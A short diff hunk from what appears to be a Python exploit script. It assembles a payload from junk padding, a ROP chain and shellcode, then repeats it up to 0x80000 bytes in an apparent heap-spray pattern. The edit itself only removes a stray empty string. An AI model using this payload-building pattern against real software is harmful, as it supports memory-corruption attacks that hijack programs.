@@ -12,7 +12,7 @@ final_payload = junk[0:offset]
 final_payload += rop
 final_payload += shellcode
 final_payload += junk[0:0x10000-offset-len(rop)-len(shellcode)]
-""
+
 
 while(len(final_payload) < 0x80000):
     final_payload += final_payload
